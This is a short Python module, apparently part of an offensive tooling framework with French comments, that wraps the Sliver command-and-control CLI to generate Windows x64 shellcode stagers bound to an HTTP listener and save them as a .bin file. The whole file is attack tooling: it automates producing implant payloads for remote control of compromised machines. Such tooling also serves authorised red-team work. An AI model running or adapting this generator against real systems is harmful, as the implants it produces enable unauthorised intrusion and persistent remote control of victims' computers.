# modules/stagers/stager_sliver.py
import os
import subprocess

class SliverStager:
    def __init__(self, sliver_path="sliver"):
        self.sliver_cli = sliver_path  # Nom ou chemin du binaire CLI sliver

    def generate(self, output_path, save_dir):
        """
        Génére un stager Sliver (shellcode, http/dns) basé sur un payload existant.
        Nécessite que Sliver CLI soit installé et dans le PATH.
        """
        try:
            # Configuration de base
            listener_name = "http"
            stager_name = "sliver_stager"
            output_file = os.path.join(save_dir, f"{stager_name}.bin")

            print(f"[+] Génération du stager Sliver dans : {output_file}")

            # Exemple : sliver generate --mtls --save /tmp/test --format shellcode
            cmd = [
                self.sliver_cli,
                "generate",
                "--listener", listener_name,
                "--save", output_file,
                "--format", "shellcode",
                "--arch", "x64",
                "--os", "windows",
                "--skip-symbols"
            ]

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                print(f"[✓] Stager Sliver généré : {output_file}")
                return output_file
            else:
                print(f"[❌] Erreur génération Sliver: {result.stderr}")
                return None

        except Exception as e:
            print(f"[!] Exception Sliver: {e}")
            return None
